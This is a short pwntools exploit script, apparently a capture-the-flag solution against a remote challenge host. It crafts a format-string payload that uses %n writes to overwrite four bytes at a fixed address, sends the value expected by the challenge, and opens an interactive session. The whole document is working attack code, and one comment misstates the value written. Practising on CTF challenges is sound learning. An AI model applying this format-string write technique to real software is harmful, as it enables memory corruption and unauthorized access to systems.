from pwn import *

address_dowrd = 0x804C044

#format overflow
payload = p32(address_dowrd) + p32(address_dowrd + 1) + p32(address_dowrd + 2) + p32(address_dowrd + 3)+ b'%10$n%11$n%12$n%13$n'

elf = ELF('pwn')
	
#now the value of word is 0x1010101010
#p = process('./pwn')
p = remote('node3.buuoj.cn', 28929)
p.sendline(payload);
p.sendline(str(0x10101010))

p.interactive()
